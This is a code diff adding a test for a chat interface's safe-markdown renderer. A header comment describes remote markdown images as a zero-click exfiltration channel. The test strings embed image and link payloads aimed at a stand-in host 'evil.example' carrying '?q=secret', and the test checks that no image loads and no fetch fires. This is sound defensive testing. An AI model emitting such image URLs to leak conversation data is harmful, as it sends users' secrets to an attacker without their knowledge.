@@ -5,9 +5,10 @@
  * its own. A remote `![](https://evil/?q=<secrets>)` is a zero-click
  * exfiltration channel that bypasses the box's egress screening entirely.
  */
-import { describe, it, expect } from "vitest";
+import { describe, it, expect, vi } from "vitest";
 import { render } from "@testing-library/react";
 import ReactMarkdown from "react-markdown";
+import remarkGfm from "remark-gfm";
 import { SAFE_MARKDOWN_COMPONENTS } from "@/components/chat/safe-markdown";
 
 function md(source: string) {
@@ -38,6 +39,25 @@ describe("SAFE_MARKDOWN_COMPONENTS (SEC-INJ-1)", () => {
     expect(c.textContent).toContain("[image: leak]");
     // The URL itself is not echoed — it may carry the exfiltrated payload.
     expect(c.textContent).not.toContain("evil");
+  });
+
+  // WARP-3917: the whole message, as ChatMessage renders it (GFM autolinks on):
+  // a remote image plus a bare URL must create no <img> and fire no fetch. A
+  // bare URL becomes a plain <a> the person has to click — no unfurl/preview.
+  it("a remote image and a bare URL load nothing until clicked", () => {
+    const fetchSpy = vi.spyOn(globalThis, "fetch");
+    const c = render(
+      <ReactMarkdown remarkPlugins={[remarkGfm]} components={SAFE_MARKDOWN_COMPONENTS}>
+        {"![x](https://evil.example/p.png?q=secret)\n\nsee https://evil.example/page?q=secret\n\n![ref][r]\n\n[r]: https://evil.example/r.png"}
+      </ReactMarkdown>,
+    ).container;
+    expect(c.querySelector("img")).toBeNull();
+    expect(c.querySelector("iframe, video, audio, link, object, embed")).toBeNull();
+    const a = c.querySelector("a")!;
+    expect(a.getAttribute("href")).toBe("https://evil.example/page?q=secret");
+    expect(a.getAttribute("rel")).toBe("noopener noreferrer");
+    expect(fetchSpy).not.toHaveBeenCalled();
+    fetchSpy.mockRestore();
   });
 
   it("keeps links clickable with noopener/noreferrer", () => {
